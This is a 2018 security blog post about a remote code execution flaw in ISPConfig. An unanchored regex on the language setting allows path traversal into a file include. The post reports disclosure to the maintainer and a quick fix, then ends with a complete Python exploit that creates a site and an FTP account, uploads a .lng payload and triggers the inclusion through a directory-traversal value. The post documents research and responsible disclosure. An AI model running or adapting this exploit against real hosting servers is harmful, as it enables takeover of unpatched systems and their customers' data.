---

title:  "Bug or Backdoor - Exploiting a Remote Code Execution in ISPConfig"
date:   2018-08-20
categories: security ispconfig exploit vulnerability
---

## Introduction
In this blogpost I will write about a suspicion I had which turned out to be false, how regex-es can go wrong and also how to chain logic features to achieve reliable Remote Command Execution. 

I was having a coffe with one of my friends who works at a web-hosting company and talking about the software they use. There I heard about ISPConfig and how many features and secure it was.Since I had some free time , I decided to have a look at it and managed to find a critical vulnerability in it.


## Finding the vulnerability

I downloaded and installed ISPConfing on a Ubuntu VM and started analyzing the source code.
There were a lot of bad practices in the code, but there were also a lot of checks which made most of the code unexploitable.ISPConfig works as a system which contains clients,
and they can create websites, ftp accounts etc., but all of them are on their own chroot.


The first thing that I do when I audit some software is to find out what the attack surface is, and what kind of bugs I want to find.  Seeing this kind of architecture I decided to audit the code that was exposed from a client user. So I started auditing it , and after a lot of failed attempts because of the aggressive checks done by ISPConfig, I found something interesting in the ```user_settings.php ``` file.

On almost any file there is a call to ``` include ISPC_ROOT_PATH.'/web/login/lib/lang/'.$_SESSION['s']['language'].'.lng';``` Searching a little bit of where this value was initialized I found the source code below.

```php
 if(preg_match('/[a-z]{2}/',$_POST['language'])) {
            $_SESSION['s']['user']['language'] = $_POST['language'];
            $_SESSION['s']['language'] = $_POST['language'];
        } else {
            $app->error('Invalid language.');
        }

```
And I was like: "Come on , not regex checks again."

But after reading the regex I noticied a flaw in the logic. The problem is that every string that contains two [a-z] characters will match the regex, and there were no further checks for path traversal attacks.

This was very strange since all of the regexes in the code had the ``` ^ regex-pattern $``` which only matched if the entire string matched the pattern not only a part of it.

Seeing this I was suspicious if this was a backdoor and not some random flaw, but after talking with Till (Maintainer of ISPConfig) he told me that it wasn't the case and the code dated back as the first version of ISPConfig 3 and it was something that was missed during the internal audits.

## Exploiting the vulnerability 

From the analysis now we have a directory traversal which can be abused for local file inclusion attacks.

Since in the new versions of php we can not use null byte injections, either a path-truncation attack but we can create a ftp-account, upload the file we want to include with ```.lng ``` extension at our path and the code will get executed as the ispconfig account and not as our chroot-ed account.


So the idea of the exploit is like this :

1. Create a Site
2. Create an FTP Account
3. Disclose the current path of the FTP upload directory.
4. Upload the payload to our directory.
5. Include the uploaded payload.
6. RCE Achieved !!!

I wrote an exploit for this bug, which automatically did all the steps above by itself.
Below is an image of the exploit in action.

![Exploiting the vulnerability](/images/isp-config-exploit.png)

## Closing remarks

This was a nice bug to find and could have been missed very easily.
An important thanks goes to Till Brehm who acknoledged the vulnerability and fixed it in 1 day, which is impressive.

You can find more details on how to update [here](https://www.ispconfig.org/blog/ispconfig-3-1-13-released-important-security-bugfix/).

# Exploit code

```python
import requests
import ftplib
import json
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


host = "REPLACE_IP:8080"
username = "REPLACE_Username"
password = "REPLACE_Password"

exp = requests.session()
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'
ftp_username = "randomusr1"
domain = "pwnerrr.com"
site_id = 1
payload_name = "pwned1"
path = ""



def login():
	r = exp.post('https://%s/login/index.php' % host,data={'username':username,'password':password,'s_mod':'login','s_pg':'index'},verify=False)
	if(r.text.find("wrong")>0):
		print "[-] Incorrect credentials [-]"
	else:
		print "[+] Logged in Succesfully [+]"


def createSite():
	
	r = exp.get('https://%s/sites/web_vhost_domain_edit.php' % host,verify=False)
	_csrf_key = r.text.split('name="_csrf_key" value="')[1].split('"')[0]
	_csrf_id = r.text.split('name="_csrf_id" value="')[1].split('"')[0]
	phpsessid = r.text.split('name="phpsessid" value="')[1].split('"')[0]
	r = exp.post('https://%s/sites/web_vhost_domain_edit.php' % host,data={'server_id':1,'ip_address':'*','ipv6_address':'','domain':'%s' % domain,'hd_quota':1024,'traffic_quota':1024,'subdomain':'www','php':'no','fastcgi_php_version':'','active':'y','id':'','_csrf_id':'%s' % _csrf_id,'_csrf_key':'%s' % _csrf_key,'next_tab':'','phpsessid':'%s' % phpsessid},verify=False)
	pass

def createFtp():
	global site_id
	r = exp.get('https://%s/sites/ftp_user_edit.php' % host,verify=False)
	print "[+] Getting IDSof the sites [+]"
	temp_array = r.text.split('<option value=')
	nr_sites = len(temp_array)
	print "[+] Number of sites %d [+]" % (int(nr_sites) - 1)
	# Find the latest created site by checking the ID.
	max_id = -9999

	for i in range(1,nr_sites):
		temp = int(temp_array[i].split('>')[0].replace("'",""))
		if(temp > max_id):
			max_id = temp
	site_id = max_id
	print "[+] Newly created site id is : %d [+]" % site_id
	_csrf_key = r.text.split('name="_csrf_key" value="')[1].split('"')[0]
	_csrf_id = r.text.split('name="_csrf_id" value="')[1].split('"')[0]
	phpsessid = r.text.split('name="phpsessid" value="')[1].split('"')[0]
	r = exp.post('https://%s/sites/ftp_user_edit.php' % host,data={'parent_domain_id':site_id,'username':'%s' % ftp_username,'password':'%s' % password,'repeat_password':'%s' % password,'quota_size':1024,'active':'y','id':'','_csrf_id':'%s' % _csrf_id,'_csrf_key':'%s' % _csrf_key,'next_tab':'','phpsessid':'%s' % phpsessid},verify=False)
	print "[+] Created FTP Account [+]"
	pass


def uploadPayload():
	ftp = ftplib.FTP(host.split(":")[0])
	ftp.login(username+ftp_username, password)
	ftp.cwd("web")
	ftp.storlines("STOR %s.lng" % payload_name,open("test.txt"))
	print "[+] Payload %s uploaded Succesfully [+]" % payload_name
	pass

def waitTillCreation():
	while 1:
		print "[+] Trying [+]"
		r = exp.get('https://%s/datalogstatus.php' % host,verify=False)
		temp = json.loads(r.text)
		if(temp["count"] == 0):
			print "[+] Everything created .... [+]"
			return
		time.sleep(5)

def getRelativePath():
	
	global path

	r = exp.get('https://%s/sites/web_vhost_domain_edit.php?id=%d&type=domain' % (host,site_id),verify=False)
	path = r.text.split('Document Root</label>')[1].split('<div class="col-sm-9">')[1].split('<')[0]
	path += "/web/" + payload_name
	print "[+] Uploading payload in %s [+]" % path

def triggerVuln():
	r = exp.get('https://%s/tools/user_settings.php' % host,verify=False)
	_csrf_key = r.text.split('name="_csrf_key" value="')[1].split('"')[0]
	_csrf_id = r.text.split('name="_csrf_id" value="')[1].split('"')[0]
	phpsessid = r.text.split('name="phpsessid" value="')[1].split('"')[0]
	user_id = r.text.split('name="id" value="')[1].split('"')[0]
	r = exp.post('https://%s/tools/user_settings.php' % host,data={'passwort':'','repeat_password':'','language':'../../../../../../../../../../../../../..%s' % path,'id':'%s' % user_id,'_csrf_id':'%s' % _csrf_id,'_csrf_key':'%s' % _csrf_key,'next_tab':'','phpsessid':'%s' % phpsessid},verify=False)
	r = exp.get('https://%s/index.php'% host,verify=False)
	print r.text

login()
createSite()
createFtp()
getRelativePath()
waitTillCreation()
uploadPayload()
triggerVuln()

```
